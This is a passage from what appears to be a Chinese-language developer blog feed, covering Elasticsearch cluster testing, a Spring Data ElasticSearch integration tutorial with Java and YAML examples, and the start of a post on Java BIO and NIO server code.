<span class="number">9302</span></span><br><span class="line"><span class="comment">#设置集群自动发现机器ip集合</span></span><br><span class="line"><span class="attr">discovery.zen.ping.unicast.hosts:</span> [<span class="string">&quot;127.0.0.1:9300&quot;</span>,<span class="string">&quot;127.0.0.1:9301&quot;</span>,<span class="string">&quot;127.0.0.1:9302&quot;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="6-2-3-启动各个节点服务器"><a href="#6-2-3-启动各个节点服务器" class="headerlink" title="6.2.3 启动各个节点服务器"></a>6.2.3 启动各个节点服务器</h3><p>双击elasticsearch-cluster\node*\bin\elasticsearch.bat</p>
<p>启动三个节点</p>
<h3 id="6-2-4-集群测试"><a href="#6-2-4-集群测试" class="headerlink" title="6.2.4 集群测试"></a>6.2.4 集群测试</h3><h4 id="添加索引和映射"><a href="#添加索引和映射" class="headerlink" title="添加索引和映射"></a>添加索引和映射</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">PUT		localhost<span class="punctuation">:</span><span class="number">9200</span>/blog1</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;mappings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;article&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                	<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;long&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;store&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span><span class="string">&quot;not_analyzed&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                	<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;store&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span><span class="string">&quot;analyzed&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;analyzer&quot;</span><span class="punctuation">:</span><span class="string">&quot;standard&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                	<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;store&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span><span class="string">&quot;analyzed&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;analyzer&quot;</span><span class="punctuation">:</span><span class="string">&quot;standard&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="添加文档"><a href="#添加文档" class="headerlink" title="添加文档"></a>添加文档</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST	localhost<span class="punctuation">:</span><span class="number">9200</span>/blog1/article/<span class="number">1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;ElasticSearch是一个基于Lucene的搜索服务器&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="string">&quot;它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>关于集群的问题</p>
<p>首先注意点在于每一个es都可能会崩溃</p>
<p>那么如果崩溃了数据怎么办？&#x3D;&#x3D;&#x3D;&#x3D;&gt;复制</p>
<p>其次索引的大小可能会超过节点的大小</p>
<p>那么需要做什么？&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;分片</p>
<p>上面就很清晰明了的说明了复制和分片在集群的用处</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="http://qpt20bgly.hd-bkt.clouddn.com/es%E9%9B%86%E7%BE%A4%E6%9E%B6%E6%9E%84.png"
                      alt="img"
                ></p>
<p>这就是三个集群常见的物理结构分布</p>
<p>同时注意到一个问题，他们是怎么知道自己是一个集群的？</p>
<p>通过集群名字自己找到的。</p>
<h1 id="Spring-Data-ElasticSearch简介"><a href="#Spring-Data-ElasticSearch简介" class="headerlink" title="Spring Data ElasticSearch简介"></a>Spring Data ElasticSearch简介</h1><h2 id="什么是Spring-Data"><a href="#什么是Spring-Data" class="headerlink" title="什么是Spring Data"></a>什么是Spring Data</h2><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架。其主要目标是使得对数据的访问变得方便快捷，并支持map-reduce框架和云计算数据服务。 Spring Data可以极大的简化JPA的写法，可以在几乎不用写实现的情况下，实现对数据的访问和操作。除了CRUD外，还包括如分页、排序等一些常用的功能。</p>
<p>Spring Data的官网：<a class="link"   href="http://projects.spring.io/spring-data/" >http://projects.spring.io/spring-data/<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="什么是Spring-Data-ElasticSearch"><a href="#什么是Spring-Data-ElasticSearch" class="headerlink" title="什么是Spring Data ElasticSearch"></a>什么是Spring Data ElasticSearch</h2><p>Spring Data ElasticSearch 基于 spring data API 简化 elasticSearch操作，将原始操作elasticSearch的客户端API 进行封装 。Spring Data为Elasticsearch项目提供集成搜索引擎。Spring Data Elasticsearch POJO的关键功能区域为中心的模型与Elastichsearch交互文档和轻松地编写一个存储库数据访问层。</p>
<p>官方网站：<a class="link"   href="http://projects.spring.io/spring-data-elasticsearch/" >http://projects.spring.io/spring-data-elasticsearch/<i class="fas fa-external-link-alt"></i></a> </p>
<h2 id="Spring-Data-ElasticSearch入门"><a href="#Spring-Data-ElasticSearch入门" class="headerlink" title="Spring Data ElasticSearch入门"></a>Spring Data ElasticSearch入门</h2><p>1）导入Spring Data ElasticSearch坐标</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- es 6.4.3版本 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-elasticsearch<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span><span class="comment">&lt;!--netty--&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.modelmapper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>modelmapper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>主要就是第一个</p>
<p>第二个是为了把某个类换成另外的一个类</p>
<p>2）yml文件中设置号ES地址</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># DataSource Config</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://127.0.0.1:3306/eblog?useUnicode=true&amp;useSSL=false&amp;characterEncoding=utf8&amp;serverTimezone=UTC</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line">  <span class="attr">data:</span></span><br><span class="line">    <span class="attr">elasticsearch:</span></span><br><span class="line">      <span class="attr">cluster-name:</span> <span class="string">elasticsearch</span></span><br><span class="line">      <span class="attr">cluster-nodes:</span> <span class="number">10.161</span><span class="number">.133</span><span class="number">.199</span><span class="string">:9300</span></span><br><span class="line">      <span class="attr">repositories:</span></span><br><span class="line">        <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>3)建立索引</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Document(indexName=&quot;post&quot;, type=&quot;post&quot;, createIndex=true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PostDocment</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="comment">//一条记录的Id</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ik分词器</span></span><br><span class="line">    <span class="meta">@Field(type = FieldType.Text, searchAnalyzer=&quot;ik_smart&quot;, analyzer = &quot;ik_max_word&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="comment">//文章的title</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Field(type = FieldType.Long)</span></span><br><span class="line">    <span class="keyword">private</span> Long authorId;</span><br><span class="line">    <span class="comment">//作者的ID</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Field(type = FieldType.Keyword)</span></span><br><span class="line">    <span class="keyword">private</span> String authorName;</span><br><span class="line">    <span class="keyword">private</span> String authorAvatar;</span><br><span class="line">    <span class="comment">//作者的名字 头像</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long categoryId;</span><br><span class="line">    <span class="comment">//分类ID</span></span><br><span class="line">    <span class="meta">@Field(type = FieldType.Keyword)</span></span><br><span class="line">    <span class="keyword">private</span> String categoryName;</span><br><span class="line">    <span class="comment">//分类的名称</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//置顶</span></span><br><span class="line">    <span class="keyword">private</span> Integer level;</span><br><span class="line">    <span class="comment">//精华</span></span><br><span class="line">    <span class="keyword">private</span> Boolean recomment;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//评论数量</span></span><br><span class="line">    <span class="keyword">private</span> Integer commentCount;</span><br><span class="line">    <span class="comment">//阅读量</span></span><br><span class="line">    <span class="keyword">private</span> Integer viewCount;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Field(type = FieldType.Date)</span></span><br><span class="line">    <span class="keyword">private</span> Date created;</span><br><span class="line">    <span class="comment">//时间</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">其中，注解解释如下：</span><br><span class="line"><span class="meta">@Document(indexName=&quot;blob3&quot;,type=&quot;article&quot;)</span>：</span><br><span class="line">    indexName：索引的名称（必填项）</span><br><span class="line">    type：索引的类型</span><br><span class="line"><span class="meta">@Id</span>：主键的唯一标识</span><br><span class="line"><span class="meta">@Field(index=true,analyzer=&quot;ik_smart&quot;,store=true,searchAnalyzer=&quot;ik_smart&quot;,type = FieldType.text)</span></span><br><span class="line">    index：是否设置分词</span><br><span class="line">    analyzer：存储时使用的分词器</span><br><span class="line">    searchAnalyze：搜索时使用的分词器</span><br><span class="line">    store：是否存储</span><br><span class="line">    type: 数据类型</span><br></pre></td></tr></table></figure>

<p>当我们配置好索引实体类，springboot会帮助我们在ES中建立好index</p>
<p>4）继承<code>ElasticsearchRepository</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.elasticsearch.es.search.responstity;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> com.elasticsearch.es.search.model.PostDocment;</span><br><span class="line">        <span class="keyword">import</span> org.springframework.data.elasticsearch.repository.ElasticsearchRepository;</span><br><span class="line">        <span class="keyword">import</span> org.springframework.stereotype.Repository;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Liduoan</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span>: 2021/3/12</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PostRepository</span> <span class="keyword">extends</span> <span class="title class_">ElasticsearchRepository</span>&lt;PostDocment, Long&gt; &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们主要通过继承然后进行ES的增删改查</p>
<p>5)数据导入索引</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Liduoan</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span>: 2021/3/12</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">indexController</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> PostService postService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    ModelMapper modelMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    PostRepository postRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/putMysql&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">getres</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//mysql查询记录</span></span><br><span class="line">        List&lt;MPost&gt; list = postService.selectAll();</span><br><span class="line">        <span class="comment">//索引值集合</span></span><br><span class="line">        List&lt;PostDocment&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">            <span class="comment">//转换类型</span></span><br><span class="line">            <span class="type">PostDocment</span> <span class="variable">map</span> <span class="operator">=</span> modelMapper.map(list.get(i), PostDocment.class);</span><br><span class="line">            res.add(map);</span><br><span class="line">        &#125;</span><br><span class="line">        postRepository.saveAll(res);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Result</span>(<span class="number">200</span>,<span class="string">&quot;ok&quot;</span>,list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ElasticSearch测试"><a href="#ElasticSearch测试" class="headerlink" title="ElasticSearch测试"></a>ElasticSearch测试</h2><p>测试可以使用全查询和根据输入查询</p>
<p>全部查询</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/getEs&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">getEs</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Iterable&lt;PostDocment&gt; all = postRepository.findAll();</span><br><span class="line">    Iterator&lt;PostDocment&gt; iterator = all.iterator();</span><br><span class="line">    List&lt;PostDocment&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">        res.add(iterator.next());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Result</span>(<span class="number">200</span>,<span class="string">&quot;OK&quot;</span>,res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据搜索条件查询</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/getEsSear&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">getEsSear</span><span class="params">(<span class="meta">@RequestParam(&quot;s&quot;)</span> String s)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">MultiMatchQueryBuilder</span> <span class="variable">multiMatchQueryBuilder</span> <span class="operator">=</span> QueryBuilders.multiMatchQuery(s,</span><br><span class="line">            <span class="string">&quot;title&quot;</span>, <span class="string">&quot;authorName&quot;</span>, <span class="string">&quot;categoryName&quot;</span>);</span><br><span class="line">    Iterable&lt;PostDocment&gt; search = postRepository.search(multiMatchQueryBuilder);</span><br><span class="line">    Iterator&lt;PostDocment&gt; iterator = search.iterator();</span><br><span class="line">    List&lt;PostDocment&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">        res.add(iterator.next());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Result</span>(<span class="number">200</span>,<span class="string">&quot;OK&quot;</span>,res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查询条件可以使用<code>MultiMatchQueryBuilder</code>说明我们要在哪些字段进行查询</p>
<p>然后把这个<code>MultiMatchQueryBuilder</code>放在<code>postRepository.search(multiMatchQueryBuilder)</code>中就可以了</p>
<p>而更新是删除和添加一起的合作</p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>IO模型</title>
    <url>/2021/09/19/2021/IO%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Java中的三种IO模型"><a href="#Java中的三种IO模型" class="headerlink" title="Java中的三种IO模型"></a>Java中的三种IO模型</h1><h2 id="BIO"><a href="#BIO" class="headerlink" title="BIO"></a>BIO</h2><p>BIO 有的称之为 Iasic(基本) IO，有的称之为 Block(阻塞) IO，主要应用于文件 IO 和网络 IO，本文主要讲述网络 IO。</p>
<p> 在 JDK1.4 之前，我们建立网络连接的时候只能采用 BIO，需要先在服务端启动一个 ServerSocket，然后在客户端启动 Socket 来对服务端进行通信，默认情况下服务端需要对每个请求建立一个线程等待请求，而客户端发送请求后，先咨询服务端是否有线程响应，如果没有则会一直等待或者遭到拒绝，如果有的话，客户端线程会等待请求结束后才继续执行，这就是阻塞式 IO。</p>
<p>我们看一个简单的案例：</p>
<ul>
<li>服务端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 创建ServerSocket，指定端口号</span></span><br><span class="line">        <span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">8888</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;等待连接...&quot;</span>);</span><br><span class="line">            <span class="comment">// 通过accept阻塞等待Socket连接，只有客户端连接后才能继续向下执行</span></span><br><span class="line">            <span class="type">Socket</span> <span class="variable">clientSocket</span> <span class="operator">=</span> serverSocket.accept();</span><br><span class="line">            System.out.println(<span class="string">&quot;有客户端连接了..&quot;</span>);</span><br><span class="line">            <span class="comment">// 通过handler方法处理客户端连接</span></span><br><span class="line">            <span class="comment">// handler(clientSocket);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 也可以给每个客户端连接单独创建一个，一个客户端分配一个线程服务</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        handler(clientSocket);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handler</span><span class="params">(Socket clientSocket)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        System.out.println(<span class="string">&quot;准备读取数据&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过输入流阻塞读取客户端发来的数据，如果客户端一直保持连接，但是没发数据，程序就会卡在这里</span></span><br><span class="line">        <span class="comment">// 1.如果读到了消息，那么返回值&gt;0</span></span><br><span class="line">        <span class="comment">// 2.如果客户端正常断开连接，那么返回值=-1</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">read</span> <span class="operator">=</span> clientSocket.getInputStream().read(bytes);</span><br><span class="line">        System.out.println(<span class="string">&quot;数据读取完毕&quot;</span>);</span><br><span class="line">        <span class="comment">// 如果读到了数据</span></span><br><span class="line">        <span class="keyword">if</span> (read != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 打印数据</span></span><br><span class="line">            System.out.println(<span class="string">&quot;接收到客户端的数据：&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="number">0</span>, read));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>socket.accept()、socket.read()、socket.write()三个主要函数都是同步阻塞的，当一个连接在处理I&#x2F;O的时候，系统是阻塞的，如果是单线程的话必然就挂死在那里；</p>
<p>但CPU是被释放出来的，开启多线程，就可以让CPU去处理更多的事情。</p>
<p>其实这也是所有使用多线程的本质： 1. 利用多核。 2. 当I&#x2F;O阻塞系统，但CPU空闲的时候，可以利用多线程使用CPU资源。</p>
<p>现在的多线程一般都使用线程池，可以让线程的创建和回收成本相对较低。在活动连接数不是特别高（小于单机1000）的情况下，这种模型是比较不错的，可以让每一个连接专注于自己的I&#x2F;O并且编程模型简单，也不用过多考虑系统的过载、限流等问题。线程池本身就是一个天然的漏斗，可以缓冲一些系统处理不了的连接或请求。</p>
<p>不过，这个模型最本质的问题在于，严重依赖于线程。</p>
<p>但线程是很”贵”的资源，主要表现在： </p>
<ol>
<li>线程的创建和销毁成本很高，在Linux这样的操作系统中，线程本质上就是一个进程。创建和销毁都是重量级的系统函数。 </li>
<li>线程本身占用较大内存，像Java的线程栈，一般至少分配512K～1M的空间，如果系统中的线程数过千，恐怕整个JVM的内存都会被吃掉一半。 </li>
<li><strong>线程的切换成本是很高的</strong>。操作系统发生线程切换的时候，需要保留线程的上下文，然后执行系统调用。如果线程数过高，可能执行线程切换的时间甚至会大于线程执行的时间，这时候带来的表现往往是系统load偏高、CPU sy使用率特别高（超过20%以上)，导致系统几乎陷入不可用的状态。</li>
<li>容易造成锯齿状的系统负载。因为系统负载是用活动线程数或CPU核心数，一旦线程数量高但外部网络环境不是很稳定，就很容易造成大量请求的结果同时返回，激活大量阻塞线程从而使系统负载压力过大。</li>
</ol>
<p>所以，当面对十万甚至百万级连接的时候，传统的BIO模型是无能为力的。随着移动端应用的兴起和各种网络游戏的盛行，百万级长连接日趋普遍，此时，必然需要一种更高效的I&#x2F;O处理模型。                                                                                                                               </p>
<p><strong>BIO的缺点：</strong></p>
<ul>
<li>上述IO代码里<code>read</code>和<code>accept</code>操作都是阻塞的，如果服务端只有一个线程，那么等待<code>read</code>数据时就无法<code>accept</code>客户端连接；等待客户端连接时也无法读数据。</li>
<li>如果给每个连接分配一个线程，会导致服务器线程太多，压力太大。</li>
<li>只要客户端连接不断开，无论是否收发数据，都会一直占用该线程，导致资源浪费。</li>
</ul>
<h2 id="NIO"><a href="#NIO" class="headerlink" title="NIO"></a>NIO</h2><p>NIO全称Non-blocking IO或New IO，是 JDK 提供的新 API。从 JDK1.4 开始，Java 提供了一系列改进的输入&#x2F;输出的新特性，被统称为 NIO。新增了许多用于处理输入输出的类，这些类都被放在<code>java.nio</code>包及子包下，并且对原 <code>java.io</code>包中的很多类进行改写，新增了满足 NIO 的功能。</p>
<p>NIO是一种同步非阻塞的IO方式，服务器实现模式为<strong>一个线程可以处理多个连接</strong>，客户端发送的连接请求都会注册到<strong>多路复用器selector</strong>上，多路复用器轮询到连接有IO请求就进行处理。</p>
<h3 id="简单案例"><a href="#简单案例" class="headerlink" title="简单案例"></a>简单案例</h3><p>我们先看一个没有引入多路复用器的案例：</p>
<ul>
<li>服务端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NioServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存客户端连接</span></span><br><span class="line">    <span class="keyword">static</span> List&lt;SocketChannel&gt; channelList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建NIO中的ServerSocketChannel,与BIO的serverSocket类似</span></span><br><span class="line">        <span class="type">ServerSocketChannel</span> <span class="variable">serverSocket</span> <span class="operator">=</span> ServerSocketChannel.open();</span><br><span class="line">        <span class="comment">// 绑定端口</span></span><br><span class="line">        serverSocket.socket().bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8888</span>));</span><br><span class="line">        <span class="comment">// 设置ServerSocketChannel为非阻塞模式</span></span><br><span class="line">        serverSocket.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;服务启动成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 核心代码</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="comment">// 非阻塞模式下accept方法不会阻塞，否则会阻塞</span></span><br><span class="line">            <span class="comment">// NIO的非阻塞是由操作系统内部实现的，底层调用了linux内核的accept函数</span></span><br><span class="line">            <span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> serverSocket.accept();</span><br><span class="line">            <span class="comment">// 如果有客户端进行连接</span></span><br><span class="line">            <span class="keyword">if</span> (socketChannel != <span class="literal">null</span>) &#123; </span><br><span class="line">                System.out.println(<span class="string">&quot;连接成功&quot;</span>);</span><br><span class="line">                <span class="comment">// 设置客户端SocketChannel为非阻塞</span></span><br><span class="line">                socketChannel.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">                <span class="comment">// 保存客户端连接在List中</span></span><br><span class="line">                channelList.add(socketChannel);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 遍历连接进行数据读取</span></span><br><span class="line">            Iterator&lt;SocketChannel&gt; iterator = channelList.iterator();</span><br><span class="line">            <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                <span class="type">SocketChannel</span> <span class="variable">sc</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">                <span class="type">ByteBuffer</span> <span class="variable">byteBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">128</span>);</span><br><span class="line">                <span class="comment">// 客户端非阻塞模式下read方法不会阻塞，否则会阻塞</span></span><br><span class="line">         